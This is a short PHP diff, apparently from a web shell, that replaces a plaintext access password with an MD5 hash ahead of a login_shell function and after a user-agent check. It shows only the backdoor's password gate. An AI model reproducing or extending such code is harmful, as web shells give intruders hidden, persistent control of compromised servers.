@@ -22,7 +22,7 @@ if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 	}
 }
 
-$password = "PutraPutriIbuPertiwi"; // md5 : Wibu
+$password = "57e1729cc1fec933d1dd2c04df9672dc"; // md5 : Wibu
 
 function login_shell()
 {
